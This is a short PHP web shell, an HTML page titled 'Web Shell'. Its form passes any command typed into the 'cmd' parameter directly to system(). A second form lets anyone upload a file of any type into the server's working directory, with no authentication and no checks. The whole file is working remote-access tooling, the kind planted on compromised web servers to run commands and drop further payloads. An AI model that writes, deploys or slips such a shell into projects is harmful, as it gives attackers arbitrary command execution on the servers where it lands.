<html>

<head>
    <title>
        Web Shell
    </title>
</head>

<form method = "GET">
    <label for="cmd"><?php echo getcwd() . " >"; ?></label>
    <input type="text" name = "cmd" autofocus id = "cmd">
    <input type="submit" name = "exec_sub" value="Execute">
</form>

<form method = "POST" enctype = "multipart/form-data">
    <label for="file_up">File: </label>
    <input type="file" name = "file_up">
    <input type="submit" name = "file_up_sub" value="Upload">
</form>

<pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);     
        }

        if(isset($_POST['file_up_sub']))
        {
            $file = $_FILES['file_up'];

            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            $fileSize = $file['size'];
            $fileError = $file['error'];
            $fileType = $file['type'];
            
            $tmp = explode('.', $fileName);
            $fileExt = strtolower(end($tmp));

            if($fileError === 0)
            {
                $fileNewName = uniqid('', true).".".$fileExt;
                move_uploaded_file($fileTmpName, getcwd()."/". $fileName);
            }
        }
    ?>
</pre>

</html>


